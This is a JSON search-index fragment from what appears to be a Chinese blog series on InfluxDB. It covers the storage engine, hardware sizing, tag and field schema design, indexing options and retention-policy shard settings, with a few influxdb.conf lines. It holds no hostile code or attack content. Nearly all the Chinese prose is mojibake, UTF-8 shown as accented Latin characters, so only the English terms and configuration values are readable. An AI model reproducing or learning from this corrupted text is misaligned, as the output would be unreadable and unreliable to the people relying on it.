ç¼“å­˜çš„æ•°æ®è¾¾åˆ°äº†ä¸€å®šçš„å¤§å°ï¼Œæˆ–è€…è¾¾åˆ°ä¸€å®šçš„æ—¶é—´é—´éš”ä¹‹åï¼Œæ•°æ®ä¼šè¢«å†™å…¥åˆ° TSM æ–‡ä»¶ä¸­ã€‚ ä¸ºäº†æ›´é«˜æ•ˆçš„å­˜å‚¨å¤§é‡æ•°æ®ï¼Œå­˜å‚¨å¼•æ“ä¼šå°†æ•°æ®è¿›è¡Œå‹ç¼©å¤„ç†ï¼Œå‹ç¼©çš„è¾“å…¥å’Œè¾“å‡ºéƒ½æ˜¯ TSM æ–‡ä»¶ï¼Œå› æ­¤ä¸ºäº†ä»¥åŸå­æ–¹å¼æ›¿æ¢ä»¥åŠåˆ é™¤ TSM æ–‡ä»¶ï¼Œå­˜å‚¨å¼•æ“ç”± FileStore è´Ÿè´£è°ƒèŠ‚å¯¹æ‰€æœ‰ TSM æ–‡ä»¶çš„è®¿é—®æƒé™ã€‚ Compaction Planner è´Ÿè´£ç¡®å®šå“ªäº› TSM æ–‡ä»¶å·²ç»å‡†å¤‡å¥½äº†å¯ä»¥è¿›è¡Œå‹ç¼©ï¼Œå¹¶ç¡®ä¿å¤šä¸ªå¹¶å‘å‹ç¼©ä¸ä¼šäº’ç›¸å¹²æ‰°ã€‚ Compactor å‹ç¼©å™¨åˆ™è´Ÿè´£å…·ä½“çš„ Compression å‹ç¼©å·¥ä½œã€‚ ä¸ºäº†å¤„ç†æ–‡ä»¶ï¼Œå­˜å‚¨å¼•æ“é€šè¿‡ Writers/Readers å¤„ç†æ•°æ®çš„å†™å’Œè¯»ã€‚å¦å¤–å­˜å‚¨å¼•æ“è¿˜ä¼šä½¿ç”¨ In-Memory Index å†…å­˜ç´¢å¼•å¿«é€Ÿè®¿é—® measurementsã€tagsã€series ç­‰æ•°æ®ã€‚ å­˜å‚¨å¼•æ“çš„ç»„æˆéƒ¨åˆ†ï¼š In-Memory Index ï¼šè·¨åˆ†ç‰‡çš„å…±äº«å†…å­˜ç´¢å¼•ï¼Œå¹¶ä¸æ˜¯å­˜å‚¨å¼•æ“æœ¬èº«ç‰¹æœ‰çš„ï¼Œå­˜å‚¨å¼•æ“åªæ˜¯ç”¨åˆ°äº†å®ƒã€‚ WAL ï¼šé¢„å†™æ—¥å¿—ã€‚ Cache ï¼šåŒæ­¥ç¼“å­˜ WAL çš„å†…å®¹ï¼Œå¹¶æœ€ç»ˆåˆ·å†™åˆ° TSM æ–‡ä»¶ä¸­å»ã€‚ TSM Files ï¼šç‰¹å®šæ ¼å¼å­˜å‚¨æœ€ç»ˆæ•°æ®çš„ç£ç›˜æ–‡ä»¶ã€‚ FileStore ï¼šè°ƒèŠ‚å¯¹ç£ç›˜ä¸Šæ‰€æœ‰TSMæ–‡ä»¶çš„è®¿é—®ã€‚ Compactor ï¼šå‹ç¼©å™¨ã€‚ Compaction Planner ï¼šå‹ç¼©è®¡åˆ’ã€‚ Compression ï¼šç¼–ç è§£ç å‹ç¼©ã€‚ Writers/Readers ï¼šè¯»å†™æ–‡ä»¶ã€‚ ç¡¬ä»¶æŒ‡å— ä¸ºäº†åº”å¯¹ä¸åŒçš„è´Ÿè½½æƒ…å†µï¼Œæˆ‘éœ€è¦æœºå™¨å…·æœ‰æ€æ ·çš„ç¡¬ä»¶é…ç½®ï¼Ÿ ç”±äºé›†ç¾¤æ¨¡å¼åªæœ‰å•†ä¸šç‰ˆæœ¬ï¼Œå› æ­¤è¿™é‡Œåªçœ‹å…è´¹çš„å•æœºç‰ˆçš„æƒ…å†µã€‚ ä¸ºäº†å®šä¹‰è´Ÿè½½ï¼Œæˆ‘ä»¬å…³æ³¨ä»¥ä¸‹ä¸‰ä¸ªæŒ‡æ ‡ï¼š æ¯ç§’å†™å…¥ æ¯ç§’æŸ¥è¯¢ series åŸºæ•° å¯¹äºæŸ¥è¯¢æƒ…å†µï¼Œæˆ‘ä»¬æ ¹æ®å¤æ‚ç¨‹åº¦åˆ†ä¸ºä¸‰çº§ï¼š ç®€å•æŸ¥è¯¢ï¼š å‡ ä¹æ²¡ç”¨å‡½æ•°å’Œæ­£åˆ™è¡¨è¾¾å¼ æ—¶é—´èŒƒå›´åœ¨å‡ åˆ†é’Ÿï¼Œå‡ å°æ—¶ï¼Œæˆ–è€…ä¸€å¤©ä¹‹å†… æ‰§è¡Œæ—¶é—´é€šå¸¸åœ¨å‡ æ¯«ç§’åˆ°å‡ åæ¯«ç§’ ä¸­ç­‰å¤æ‚åº¦æŸ¥è¯¢ï¼š ä½¿ç”¨äº†å¤šä¸ªå‡½æ•°å’Œä¸€ä¸¤ä¸ªæ­£åˆ™è¡¨è¾¾å¼ å¯èƒ½ä½¿ç”¨äº†å¤æ‚çš„ GROUP BY è¯­å¥ï¼Œæˆ–è€…æ—¶é—´èŒƒå›´æ˜¯å‡ ä¸ªæ˜ŸæœŸ æ‰§è¡Œæ—¶é—´é€šå¸¸åœ¨å‡ ç™¾æ¯«ç§’åˆ°å‡ åƒæ¯«ç§’ å¤æ‚æŸ¥è¯¢ï¼š ä½¿ç”¨äº†å¤šä¸ªèšåˆã€è½¬æ¢å‡½æ•°ï¼Œæˆ–è€…å¤šä¸ªæ­£åˆ™è¡¨è¾¾å¼ æ—¶é—´è·¨åº¦å¾ˆå¤§ï¼Œæœ‰å‡ ä¸ªæœˆæˆ–å‡ å¹´ æ‰§è¡Œæ—¶é—´è¾¾åˆ°ç§’çº§ ç¡¬ä»¶é…ç½®éœ€è¦å…³æ³¨çš„æœ‰ï¼šCPU æ ¸æ•°ï¼ŒRAM å†…å­˜å¤§å°ï¼ŒIOPS æ€§èƒ½ã€‚ IOPSï¼ˆ Input/Output Operations Per Second ï¼‰ï¼šæ¯ç§’è¯»å†™æ•°ï¼Œè¡¡é‡å­˜å‚¨è®¾å¤‡ï¼ˆå¦‚ SSD å›ºæ€ç¡¬ç›˜ã€HDD æœºæ¢°ç¡¬ç›˜ç­‰ï¼‰çš„æ€§èƒ½æŒ‡æ ‡ã€‚ ä¸åŒè´Ÿè½½æƒ…å†µä¸‹çš„ç¡¬ä»¶é…ç½®å‚è€ƒå¦‚ä¸‹ï¼š ç”±äº SSD å›ºæ€ç¡¬ç›˜çš„æ€§èƒ½æ›´é«˜ï¼Œå®˜æ–¹ä¹Ÿå»ºè®®ä½¿ç”¨ SSD ï¼Œä¸Šå›¾ä¹Ÿæ˜¯ä½¿ç”¨ SSD çš„æƒ…å†µã€‚ å¯¹äºå…ƒæ•°æ®ï¼Œè¯¸å¦‚ database nameã€measurementã€tag keyã€tag valueã€field key éƒ½åªä¼šå­˜å‚¨ä¸€æ¬¡ï¼Œåªæœ‰ field value å’Œ timestamp æ¯ä¸ªç‚¹éƒ½å­˜å‚¨ã€‚éå­—ç¬¦ä¸²çš„å€¼å¤§çº¦éœ€è¦ä¸‰ä¸ªå­—èŠ‚ï¼Œå­—ç¬¦ä¸²çš„å€¼éœ€è¦çš„ç©ºé—´å¤§å°ä¸å›ºå®šï¼Œéœ€è¦ç”±å‹ç¼©æƒ…å†µç¡®å®šã€‚ å†…å­˜è‚¯å®šæ˜¯è¶Šå¤§è¶Šå¥½ï¼Œä½†æ˜¯å¦‚æœ series åŸºæ•°è¶…è¿‡åƒä¸‡çº§åˆ«ï¼Œåœ¨é»˜è®¤ä½¿ç”¨çš„ in-memory ç´¢å¼•æ–¹å¼ä¸‹ï¼Œä¼šå¯¼è‡´å†…å­˜æº¢å‡ºï¼Œåœ¨æ•°æ®ç»“æ„è®¾è®¡æ—¶éœ€è¦æ³¨æ„ã€‚ é€šè¿‡å°† wal å’Œ data ç›®å½•è®¾ç½®åˆ°ä¸åŒçš„å­˜å‚¨è®¾å¤‡ä¸Šï¼Œæœ‰åˆ©äºå‡å°‘ç£ç›˜çš„äº‰ç”¨ï¼Œä»è€Œåº”å¯¹æ›´é«˜çš„å†™å…¥è´Ÿè½½ã€‚ç›¸å…³é…ç½®é¡¹ï¼ˆé»˜è®¤çš„é…ç½®æ–‡ä»¶ä¸º influxdb.conf ï¼‰ï¼š [data] dir = \"/var/lib/influxdb/data\" wal-dir = \"/var/lib/influxdb/wal\" ç›¸å…³æ–‡ç« ï¼š æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆä¸€ï¼‰ æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆäºŒï¼‰ æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆä¸‰ï¼‰ æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆå››ï¼‰ æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆäº”ï¼‰ æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆå…­ï¼‰ æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆä¸ƒï¼‰ ","date":"2019-10-28","objectID":"/4/:0:0","tags":["InfluxDB"],"title":"æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆå››ï¼‰","uri":"/4/"},{"categories":["InfluxDB"],"content":"æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆä¸‰ï¼‰","date":"2019-10-27","objectID":"/3/","tags":["InfluxDB"],"title":"æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆä¸‰ï¼‰","uri":"/3/"},{"categories":["InfluxDB"],"content":"æ•°æ®ç±»å‹ InfluxDB æ˜¯ä¸€ä¸ªæ— ç»“æ„æ¨¡å¼ï¼Œè¿™ä¹Ÿå°±æ˜¯è¯´ä½ æ— éœ€äº‹å…ˆå®šä¹‰å¥½è¡¨ä»¥åŠè¡¨çš„æ•°æ®ç»“æ„ã€‚ InfluxDB æ”¯æŒçš„æ•°æ®ç±»å‹éå¸¸ç®€å•ï¼š measurement : string tag key : string tag value : string field key : string field value : string , float , interger , boolean ä½ å¯ä»¥çœ‹åˆ°é™¤äº† field value æ”¯æŒçš„æ•°æ®ç±»å‹å¤šä¸€ç‚¹ä¹‹å¤–ï¼Œå…¶ä½™å…¨æ˜¯å­—ç¬¦ä¸²ç±»å‹ã€‚ å½“ç„¶è¿˜æœ‰æœ€é‡è¦çš„ timestamp ï¼ŒInfluxDB ä¸­çš„æ—¶é—´éƒ½æ˜¯ UTC æ—¶é—´ï¼Œè€Œä¸”æ—¶é—´ç²¾åº¦éå¸¸é«˜ï¼Œé»˜è®¤ä¸ºçº³ç§’ã€‚ ","date":"2019-10-27","objectID":"/3/:0:1","tags":["InfluxDB"],"title":"æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆä¸‰ï¼‰","uri":"/3/"},{"categories":["InfluxDB"],"content":"æ•°æ®ç»“æ„è®¾è®¡ åœ¨å®é™…ä½¿ç”¨ä¸­ï¼Œæ•°æ®éƒ½æ˜¯å­˜å‚¨åœ¨ tag æˆ–è€… field ä¸­ï¼Œè¿™ä¸¤è€…æœ€é‡è¦çš„åŒºåˆ«å°±æ˜¯ï¼Œtag ä¼šæ„å»ºç´¢å¼•ï¼ˆä¹Ÿå°±æ˜¯è¯´æŸ¥è¯¢æ—¶ï¼Œwhere æ¡ä»¶é‡Œçš„æ˜¯ tag ï¼Œåˆ™æŸ¥è¯¢æ€§èƒ½æ›´é«˜ï¼‰ï¼Œfield åˆ™ä¸ä¼šè¢«ç´¢å¼•ã€‚ å­˜å‚¨æ•°æ®åˆ°åº•æ˜¯ä½¿ç”¨ tag è¿˜æ˜¯ field ï¼Œå‚è€ƒä»¥ä¸‹åŸåˆ™ï¼š å¸¸ç”¨äºæŸ¥è¯¢æ¡ä»¶çš„æ•°æ®å­˜å‚¨ä¸º tag ã€‚ è®¡åˆ’ä½¿ç”¨ GROUP BY() çš„æ•°æ®å­˜å‚¨ä¸º tag ã€‚ è®¡åˆ’ä½¿ç”¨ InfluxQL function çš„æ•°æ®å­˜å‚¨ä¸º field ã€‚ æ•°æ®ä¸åªæ˜¯ string ç±»å‹çš„å­˜å‚¨ä¸º field ã€‚ å¯¹äºæ ‡è¯†æ€§çš„åç§°ï¼Œå¦‚ databaseã€RPã€userã€measurementã€tag keyã€field key è¿™äº›åº”è¯¥é¿å…ä½¿ç”¨ InfluxQL ä¸­çš„å…³é”®å­—ã€‚ å…¶å®ƒéœ€è¦æ³¨æ„çš„åŸåˆ™ï¼š ä¸è¦æœ‰è¿‡äºåºå¤§çš„ series ã€‚è‹¥åœ¨ tag ä¸­ä½¿ç”¨ UUIDã€hashã€éšæœºå­—ç¬¦ä¸²ç­‰å°†ä¼šå¯¼è‡´æ•°é‡åºå¤§çš„ series ï¼Œè¿™å°†ä¼šå¯¼è‡´æ›´é«˜çš„å†…å­˜ä½¿ç”¨ç‡ï¼Œå°¤å…¶æ˜¯ç³»ç»Ÿå†…å­˜æœ‰é™çš„æƒ…å†µä¸‹éœ€è¦é¢å¤–æ³¨æ„ã€‚ measurement åç§°ä¸åº”è¯¥åŒ…å«å…·ä½“çš„æ•°æ®ï¼ˆè¡¨åå°±æ˜¯ä¸€ä¸ªå•çº¯çš„è¡¨åï¼‰ï¼Œä½ åº”è¯¥ä½¿ç”¨ä¸åŒçš„ tag å»åŒºåˆ†æ•°æ®ï¼Œè€Œä¸æ˜¯ measurement åç§°ã€‚ ä¸€ä¸ª tag ä¸­ä¸è¦æ”¾ç½®å¤šæ¡ä¿¡æ¯ï¼Œå¤æ‚çš„ä¿¡æ¯åˆç†æ‹†åˆ†ä¸ºå¤šä¸ª tag æœ‰åŠ©äºç®€åŒ–æŸ¥è¯¢å¹¶å‡å°‘ä½¿ç”¨æ­£åˆ™ã€‚ ","date":"2019-10-27","objectID":"/3/:0:2","tags":["InfluxDB"],"title":"æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆä¸‰ï¼‰","uri":"/3/"},{"categories":["InfluxDB"],"content":"ç´¢å¼• InfluxDB é€šè¿‡æ„å»ºç´¢å¼•å¯ä»¥æé«˜æŸ¥è¯¢æ€§èƒ½ã€‚InfluxDB ä¸­çš„ç´¢å¼•æœ‰ä¸¤ç§ï¼šIn-memory å’Œ TSI ã€‚è¿™ä¸¤ç§ç´¢å¼•åªèƒ½é€‰æ‹©ä¸€ç§ï¼Œä¸”æ— æ³•åŠ¨æ€æ›´æ”¹ï¼Œä¸€æ—¦æ›´æ”¹å¿…é¡»é‡å¯ InfluxDB ã€‚ In-memory ï¼šç´¢å¼•è¢«å­˜å‚¨åœ¨å†…å­˜ä¸­ï¼Œè¿™ä¹Ÿæ˜¯é»˜è®¤ä½¿ç”¨çš„æ–¹å¼ï¼Œæ€§èƒ½æ›´é«˜ã€‚ TSIï¼ˆ Time Series Index ï¼‰ï¼šIn-memory ç´¢å¼•å¯ä»¥æ”¯æŒåƒä¸‡çº§åˆ«çš„ series ï¼Œç„¶è€Œå†…å­˜èµ„æºç»ˆå½’æ˜¯æœ‰é™çš„ï¼Œä¸ºäº†æ”¯æŒäº¿çº§å’Œåäº¿çº§åˆ«çš„ series æ•°æ®ï¼ŒTSI åº”è¿è€Œç”Ÿï¼Œå…¶ä¼šå°†ç´¢å¼•æ˜ å°„åˆ°ç£ç›˜æ–‡ä»¶ä¸Šã€‚ ç´¢å¼•ç›¸å…³é…ç½®é¡¹ï¼ˆé»˜è®¤çš„é…ç½®æ–‡ä»¶ä¸º influxdb.conf ï¼‰ï¼š ç´¢å¼•æ–¹å¼ï¼Œinmem æˆ–è€… tsi1 ï¼š index-version = \"inmem\" in-memory ç›¸å…³è®¾ç½®ï¼š max-series-per-database = 1000000 max-values-per-tag = 100000 max-series-per-database ï¼šæ¯ä¸ªæ•°æ®åº“å…è®¸çš„æœ€å¤§ series æ•°é‡ï¼Œé»˜è®¤ä¸€ç™¾ä¸‡ï¼Œä¸€æ—¦è¾¾åˆ°ä¸Šé™ï¼Œå†å†™å…¥æ–°çš„ series åˆ™ä¼šå¾—åˆ°ä¸€ä¸ª 500 é”™è¯¯ï¼Œå‘å·²ç»å­˜åœ¨çš„ series å†™å…¥æ•°æ®ä¸å—å½±å“ã€‚è®¾ç½®ä¸º 0 åˆ™æ„å‘³ç€æ²¡æœ‰é™åˆ¶ã€‚ max-values-per-tag ï¼šæ¯ä¸ª tag key å…è®¸çš„æœ€å¤§ tag values æ•°é‡ï¼Œé»˜è®¤åä¸‡ï¼Œç±»ä¼¼çš„ï¼Œä¸€æ—¦è¾¾åˆ°ä¸Šé™ï¼Œæ— æ³•å†™å…¥æ–°çš„ tag value ï¼Œè€Œå‘å·²ç»å­˜åœ¨çš„ tag value å†™å…¥æ•°æ®ä¸å—å½±å“ã€‚è®¾ç½®ä¸º 0 åˆ™æ„å‘³ç€æ²¡æœ‰é™åˆ¶ã€‚ TSIï¼ˆ tsi1 ï¼‰ç›¸å…³è®¾ç½®ï¼š max-index-log-file-size = \"1m\" series-id-set-cache-size = 100 max-index-log-file-size ï¼šé¢„å†™æ—¥å¿—çš„æ–‡ä»¶å¤§å°è¾¾åˆ°å¤šå¤§çš„é˜ˆå€¼ä¹‹åï¼Œå°†å…¶å‹ç¼©ä¸ºç´¢å¼•æ–‡ä»¶ï¼Œé˜ˆå€¼è¶Šä½ï¼Œå‹ç¼©è¶Šå¿«ï¼Œå †å†…å­˜ä½¿ç”¨ç‡è¶Šä½ï¼Œä½†ä¼šé™ä½å†™å…¥çš„ååé‡ã€‚ series-id-set-cache-size ï¼šä½¿ç”¨å†…å­˜ç¼“å­˜çš„ series é›†çš„å¤§å°ï¼Œç”±äº TSI ç´¢å¼•å­˜å‚¨åœ¨äº†ç£ç›˜æ–‡ä»¶ä¸­ï¼Œå› æ­¤ä½¿ç”¨æ—¶éœ€è¦é¢å¤–çš„è®¡ç®—å·¥ä½œï¼Œä½†å¦‚æœå°†ç´¢å¼•ç»“æœç¼“å­˜èµ·æ¥çš„è¯å°±å¯ä»¥é¿å…é‡å¤çš„è®¡ç®—ï¼Œæé«˜æŸ¥è¯¢æ€§èƒ½ã€‚é»˜è®¤ç¼“å­˜ 100 ä¸ª series ï¼Œè¿™ä¸ªå€¼è¶Šå¤§åˆ™ä½¿ç”¨çš„å †å†…å­˜è¶Šå¤§ï¼Œè®¾ç½®ä¸º 0 åˆ™ä¸ç¼“å­˜ã€‚ ç›¸å…³æ–‡ç« ï¼š æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆä¸€ï¼‰ æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆäºŒï¼‰ æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆä¸‰ï¼‰ æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆå››ï¼‰ æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆäº”ï¼‰ æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆå…­ï¼‰ æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆä¸ƒï¼‰ ","date":"2019-10-27","objectID":"/3/:0:3","tags":["InfluxDB"],"title":"æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆä¸‰ï¼‰","uri":"/3/"},{"categories":["InfluxDB"],"content":"æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆäºŒï¼‰","date":"2019-10-26","objectID":"/2/","tags":["InfluxDB"],"title":"æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆäºŒï¼‰","uri":"/2/"},{"categories":["InfluxDB"],"content":" RP å…ˆå›é¡¾ä¸€ä¸‹ RP ç­–ç•¥ï¼ˆ retention policy ï¼‰ï¼Œå®ƒç”±ä¸‰ä¸ªéƒ¨åˆ†æ„æˆï¼š DURATIONï¼šæ•°æ®çš„ä¿ç•™æ—¶é•¿ã€‚ REPLICATIONï¼šé›†ç¾¤æ¨¡å¼ä¸‹æ•°æ®çš„å‰¯æœ¬æ•°ï¼Œå•èŠ‚ç‚¹æ— æ•ˆã€‚ SHARD DURATIONï¼šå¯é€‰é¡¹ï¼Œshard group åˆ’åˆ†çš„æ—¶é—´èŒƒå›´ã€‚ å‰ä¸¤ä¸ªéƒ¨åˆ†æ²¡å•¥å¥½è¯´çš„ï¼Œè€Œ shard duration å’Œ shard group çš„æ¦‚å¿µä½ å¯èƒ½ä¼šæ„Ÿåˆ°æ¯”è¾ƒé™Œç”Ÿã€‚ shard æ˜¯ä»€ä¹ˆï¼Ÿ å…ˆæ¥çœ‹æ•°æ®çš„å±‚æ¬¡ç»“æ„ï¼š å¦‚æœæ‰€ç¤ºï¼Œä¸€ä¸ª database å¯¹åº”ä¸€ä¸ªå®é™…çš„ç£ç›˜ä¸Šçš„æ–‡ä»¶å¤¹ï¼Œè¯¥æ•°æ®åº“ä¸‹ä¸åŒçš„ RP ç­–ç•¥å¯¹åº”ä¸åŒçš„æ–‡ä»¶å¤¹ã€‚ shard group åªæ˜¯ä¸€ä¸ªé€»è¾‘æ¦‚å¿µï¼Œå¹¶æ²¡æœ‰å®é™…çš„ç£ç›˜æ–‡ä»¶å¤¹ï¼Œshard group åŒ…å«æœ‰ä¸€ä¸ªæˆ–å¤šä¸ª shard ã€‚ æœ€ç»ˆçš„æ•°æ®æ˜¯å­˜å‚¨åœ¨ shard ä¸­çš„ï¼Œæ¯ä¸ª shard ä¹Ÿå¯¹åº”ä¸€ä¸ªå…·ä½“çš„ç£ç›˜æ–‡ä»¶ç›®å½•ï¼Œæ•°æ®æ˜¯æŒ‰ç…§æ—¶é—´èŒƒå›´åˆ†å‰²å­˜å‚¨çš„ï¼Œshard duration ä¹Ÿå°±æ˜¯åˆ’åˆ† shard group çš„æ—¶é—´èŒƒå›´ï¼ˆä¾‹å¦‚ shard duration å¦‚æœæ˜¯ä¸€å‘¨ï¼Œé‚£ä¹ˆç¬¬ä¸€å‘¨çš„æ•°æ®å°±ä¼šå­˜å‚¨åˆ°ä¸€ä¸ª shard group ä¸­ï¼Œç¬¬äºŒå‘¨çš„æ•°æ®ä¼šå­˜å‚¨åˆ°å¦å¤–ä¸€ä¸ª shard group ä¸­ï¼Œä»¥æ­¤ç±»æ¨ï¼‰ã€‚ å¦å¤–ï¼Œæ¯ä¸ª shard ç›®å½•ä¸‹éƒ½æœ‰ä¸€ä¸ª TSM æ–‡ä»¶ï¼ˆåç¼€åä¸º .tsm ï¼‰ï¼Œæ­£æ˜¯è¿™ä¸ªæ–‡ä»¶å­˜å‚¨äº†æœ€åç¼–ç å’Œå‹ç¼©åçš„æ•°æ®ã€‚shard group ä¸‹çš„ shard æ˜¯æŒ‰ç…§ series æ¥åˆ’åˆ†çš„ï¼Œæ¯ä¸ª shard åŒ…å«ä¸€ç»„ç‰¹å®šçš„ series ï¼Œæ¢å¥è¯è¯´ç‰¹å®š shard group ä¸­çš„ç‰¹å®š series ä¸Šçš„æ‰€æœ‰ points ç‚¹éƒ½å­˜å‚¨åœ¨åŒä¸€ä¸ª TSM æ–‡ä»¶ä¸­ã€‚ shard duration shard ä»å±äºå”¯ä¸€ä¸€ä¸ª shard group ï¼Œshard duration å’Œ shard group duration æ˜¯åŒä¸€ä¸ªæ¦‚å¿µã€‚ å¦‚å‰æ–‡æ‰€è¿°ï¼Œæ•°æ®æŒ‰ç…§æ—¶é—´èŒƒå›´åˆ†å‰²å­˜å‚¨ï¼Œåˆ†å‰²çš„æ—¶é—´èŒƒå›´ç”± RP ç­–ç•¥ä¸­çš„ shard group duration æŒ‡å®šã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œshard group duration æ ¹æ® RP duration çš„å€¼æ¥ç¡®å®šï¼Œå¯¹åº”å…³ç³»å¦‚ä¸‹å›¾ï¼š RP ç­–ç•¥æ˜¯ä¸å¯æˆ–ç¼ºçš„ï¼Œå¦‚æœæœªè®¾ç½®åˆ™ä¼šä½¿ç”¨é»˜è®¤çš„åç§°ä¸º autogen çš„ RP ï¼Œå®ƒçš„ duration æ˜¯ infinite ä¹Ÿå°±æ˜¯æ•°æ®ä¸ä¼šè¿‡æœŸï¼Œshard group duration æ˜¯ 7 å¤©ï¼ˆ duration æ˜¯ infinite å¯¹åº”çš„å°±æ˜¯ \u003e 6 months è¿™ä¸€æ ï¼‰ã€‚ shard group duration è®¾ç½®ä¸ºå¤šä¹…æ‰æœ€å¥½ï¼Ÿ é•¿æ—¶é—´èŒƒå›´ï¼šæœ‰åˆ©äºå­˜å‚¨æ›´å¤šæ•°æ®ï¼Œæ•´ä½“æ€§èƒ½æ›´å¥½ã€‚ çŸ­æ—¶é—´èŒƒå›´ï¼šçµæ´»æ€§æ›´é«˜ï¼Œæœ‰åˆ©äºåˆ é™¤è¿‡æœŸæ•°æ®å’Œè®°å½•å¢é‡å¤‡ä»½ã€‚åˆ é™¤è¿‡æœŸæ•°æ®æ˜¯åˆ é™¤æ•´ä¸ª shard group è€Œä¸æ˜¯å•ä¸ªçš„ shard ã€‚ é»˜è®¤é…ç½®å¯¹äºå¤§å¤šæ•°åœºæ™¯éƒ½è¿è¡Œçš„å¾ˆå¥½ï¼Œç„¶è€Œï¼Œé«˜ååé‡æˆ–é•¿æ—¶é—´è¿è¡Œçš„å®ä¾‹å°†å—ç›Šäºæ›´é•¿çš„ shard group duration ï¼Œå®˜æ–¹å»ºè®®çš„é…ç½®å¦‚ä¸‹ï¼š å…¶å®ƒä¸€äº›éœ€è¦è€ƒè™‘çš„å› ç´ ï¼š shard group åº”è¯¥åŒ…å«æœ€é¢‘ç¹æŸ¥è¯¢çš„æœ€é•¿æ—¶é—´èŒƒå›´çš„ä¸¤å€ã€‚ æ¯ä¸ª shard group åº”è¯¥åŒ…å«è¶…è¿‡åä¸‡ä¸ª point ã€‚ shard group ä¸­çš„æ¯ä¸ª series åº”è¯¥åŒ…å«è¶…è¿‡ä¸€åƒä¸ª point ã€‚ å¦å¤–ï¼Œæ‰¹é‡æ’å…¥é•¿æ—¶é—´èŒƒå›´å†…çš„å¤§é‡å†å²æ•°æ®å°†ä¼šä¸€æ¬¡è§¦å‘å¤§é‡ shard çš„åˆ›å»ºï¼Œå¹¶å‘è®¿é—®å’Œå†™å…¥æˆç™¾ä¸Šåƒçš„ shard ä¼šå¯¼è‡´æ€§èƒ½é™ä½å’Œå†…å­˜è€—å°½ï¼Œå¯¹äºè¿™ç§æƒ…å†µå»ºè®®ä¸´æ—¶è®¾ç½®è¾ƒé•¿çš„ shard group duration æ¯”å¦‚ 52 å‘¨ã€‚ RP ç­–ç•¥å¯ä»¥åŠ¨æ€è°ƒæ•´ï¼Œåˆ é™¤ä¸€ä¸ª RP å°†ä¼šåˆ é™¤å…¶ä¸‹çš„æ‰€æœ‰æ•°æ®ã€‚ ç›¸å…³æ–‡ç« ï¼š æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆä¸€ï¼‰ æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆäºŒï¼‰ æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆä¸‰ï¼‰ æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆå››ï¼‰ æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆäº”ï¼‰ æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆå…­ï¼‰ æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆä¸ƒï¼‰ ","date":"2019-10-26","objectID":"/2/:0:0","tags":["InfluxDB"],"title":"æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆäºŒï¼‰","uri":"/2/"},{"categories":["InfluxDB"],"content":"æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆä¸€ï¼‰","date":"2019-10-25","objectID":"/1/","tags":["InfluxDB"],"title":"æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆä¸€ï¼‰","uri":"/1/"},{"categories":["InfluxDB"],"content":" æ•°æ®åº“ç§ç±»æœ‰å¾ˆå¤šï¼Œæ¯”å¦‚ä¼ ç»Ÿçš„å…³ç³»å‹æ•°æ®åº“ RDBMSï¼ˆ å¦‚ MySQL ï¼‰ï¼ŒNoSQL æ•°æ®åº“ï¼ˆ å¦‚ MongoDB ï¼‰ï¼ŒKey-Value ç±»å‹ï¼ˆ å¦‚ redis ï¼‰ï¼ŒWide column ç±»å‹ï¼ˆ å¦‚ HBase ï¼‰ç­‰ç­‰ç­‰ç­‰ï¼Œå½“ç„¶è¿˜æœ‰æœ¬ç³»åˆ—æ–‡ç« å°†ä¼šä»‹ç»çš„æ—¶åºæ•°æ®åº“ TSDBï¼ˆ å¦‚ InfluxDB ï¼‰ã€‚ æ—¶åºæ•°æ®åº“ TSDB ä¸åŒçš„æ•°æ®åº“é’ˆå¯¹çš„åº”ç”¨åœºæ™¯æœ‰ä¸åŒçš„åé‡ã€‚TSDBï¼ˆ time series database ï¼‰æ—¶åºæ•°æ®åº“æ˜¯ä¸“é—¨ä»¥æ—¶é—´ç»´åº¦è¿›è¡Œè®¾è®¡å’Œä¼˜åŒ–çš„ã€‚ TSDB é€šå¸¸å…·æœ‰ä»¥ä¸‹çš„ç‰¹ç‚¹ï¼š æ—¶é—´æ˜¯ä¸å¯æˆ–ç¼ºçš„ç»å¯¹ä¸»è§’ï¼ˆå°±åƒ MySQL ä¸­çš„ä¸»é”®ä¸€æ ·ï¼‰ï¼Œæ•°æ®æŒ‰ç…§æ—¶é—´é¡ºåºç»„ç»‡ç®¡ç† é«˜å¹¶å‘é«˜ååé‡çš„æ•°æ®å†™å…¥ æ•°æ®çš„æ›´æ–°å¾ˆå°‘å‘ç”Ÿ è¿‡æœŸçš„æ•°æ®å¯ä»¥æ‰¹é‡åˆ é™¤ InfluxDB å°±æ˜¯ä¸€æ¬¾éå¸¸ä¼˜ç§€çš„æ—¶åºæ•°æ®åº“ï¼Œé«˜å±… DB-Engines TSDB rank æ¦œé¦–ã€‚ InfluxDB 